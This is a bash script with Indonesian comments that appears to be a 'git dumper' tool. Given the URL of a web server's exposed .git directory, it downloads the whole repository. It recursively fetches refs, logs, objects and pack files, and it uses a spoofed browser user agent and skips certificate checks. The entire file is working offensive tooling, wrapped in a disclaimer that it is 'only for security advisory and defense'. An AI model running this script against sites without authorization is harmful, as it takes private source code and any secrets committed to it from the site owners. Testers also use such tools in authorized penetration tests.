#!/bin/bash
#$1 : URL untuk download .git dari (http://target.com/.git/)
#$2 : Folder dimana .git-folder akan dibuat

function init_header() {
    cat <<EOF
###########################################################################
# 死の目(Shi No Me) created by : Yogi Junior                                        
#                                                                        
# Developed and maintained by @yogijr5                                   
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for Security Advisory & Defense!
###########################################################################


EOF
}

# get_git_dir "$@" for "--git-dir=asd"
# kembali ke asd dalam GITDIR
function get_git_dir() {
    local FLAG="--git-dir="
    local ARGS=${@}

    for arg in $ARGS
    do
        if [[ $arg == $FLAG* ]]; then
            echo "${arg#$FLAG}"
            return
        fi
    done

    echo ".git"
}

init_header


QUEUE=();
DOWNLOADED=();
BASEURL="$1";
BASEDIR="$2";
GITDIR=$(get_git_dir "$@")
BASEGITDIR="$BASEDIR/$GITDIR/";

if [ $# -lt 2 ]; then
    echo -e "\033[33m[*] Perintah: http://target.tld/.git/ folder-tujuan [--git-dir=foldlain]\033[0m";
    echo -e "\t\t--git-dir=foldlain\t\tMerubah nama folder git. Default: .git"
    exit 1;
fi


if [[ ! "$BASEURL" =~ /$GITDIR/$ ]]; then
    echo -e "\033[31m[-] /$GITDIR/ tidak di temukan dalam url\033[0m";
    exit 0;
fi

if [ ! -d "$BASEGITDIR" ]; then
    echo -e "\033[33m[*] Folder tujuan tidak di temukan\033[0m";
    echo -e "\033[32m[+] Membuat $BASEGITDIR\033[0m";
    mkdir -p "$BASEGITDIR";
fi


function start_download() {
    #Menambahkan initial/static file git
    QUEUE+=('HEAD')
    QUEUE+=('objects/info/packs')
    QUEUE+=('description')
    QUEUE+=('config')
    QUEUE+=('COMMIT_EDITMSG')
    QUEUE+=('index')
    QUEUE+=('packed-refs')
    QUEUE+=('refs/heads/master')
    QUEUE+=('refs/remotes/origin/HEAD')
    QUEUE+=('refs/stash')
    QUEUE+=('logs/HEAD')
    QUEUE+=('logs/refs/heads/master')
    QUEUE+=('logs/refs/remotes/origin/HEAD')
    QUEUE+=('info/refs')
    QUEUE+=('info/exclude')
    QUEUE+=('/refs/wip/index/refs/heads/master')
    QUEUE+=('/refs/wip/wtree/refs/heads/master')

    #Memulai antrian ketika sudah tidak ada file di download
    while [ ${#QUEUE[*]} -gt 0 ]
    do
        download_item ${QUEUE[@]:0:1}
        #Menghapus konten dari antran
        QUEUE=( "${QUEUE[@]:1}" )
    done
}

function download_item() {
    local objname=$1
    local url="$BASEURL$objname"
    local hashes=()
    local packs=()

    #periksa file jika sudah ter-download
    if [[ " ${DOWNLOADED[@]} " =~ " ${objname} " ]]; then
        return
    fi

    local target="$BASEGITDIR$objname"

    #Membuat folder
    dir=$(echo "$objname" | grep -oE "^(.*)/")
    if [ $? -ne 1 ]; then
        mkdir -p "$BASEGITDIR/$dir"
    fi

    #Download file
    curl -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" -f -k -s "$url" -o "$target"
    
    #Menandai yg sudah di download & menghapus antrian
    DOWNLOADED+=("$objname")
    if [ ! -f "$target" ]; then
        echo -e "\033[31m[-] Gagal MengUnduh: $objname\033[0m"
        return
    fi
    echo -e "\033[32m[+] Berhasil MengUnduh: $objname\033[0m"

    #Memeriksa jika ada objek yang di hash
    if [[ "$objname" =~ /[a-f0-9]{2}/[a-f0-9]{38} ]]; then 
        #Mengalihkan ke $BASEDIR dan menyimpan di direktory aktif
        cwd=$(pwd)
        cd "$BASEDIR"
        
        #Restore hash dari objek $objectname
        hash=$(echo "$objname" | sed -e 's~objects~~g' | sed -e 's~/~~g')
        
        #Periksa jika objek git yang valid
        type=$(git cat-file -t "$hash" 2> /dev/null)
        if [ $? -ne 0 ]; then
            #Hapus invalid file
            cd "$cwd"
            rm "$target"
            return 
        fi
        
        #Membuat keluaran git cat-file -p $hash. Menggunakan strings for blobs
        if [[ "$type" != "blob" ]]; then
            hashes+=($(git cat-file -p "$hash" | grep -oE "([a-f0-9]{40})"))
        else
            hashes+=($(git cat-file -p "$hash" | strings -a | grep -oE "([a-f0-9]{40})"))
        fi

        cd "$cwd"
    fi 
    
    #Parser file untuk objek lain
    hashes+=($(cat "$target" | strings -a | grep -oE "([a-f0-9]{40})"))
    for hash in ${hashes[*]}
    do
        QUEUE+=("objects/${hash:0:2}/${hash:2}")
    done

    #Parser file untuk packs
    packs+=($(cat "$target" | strings -a | grep -oE "(pack\-[a-f0-9]{40})"))
    for pack in ${packs[*]}
    do 
        QUEUE+=("objects/pack/$pack.pack")
        QUEUE+=("objects/pack/$pack.idx")
    done
}


start_download
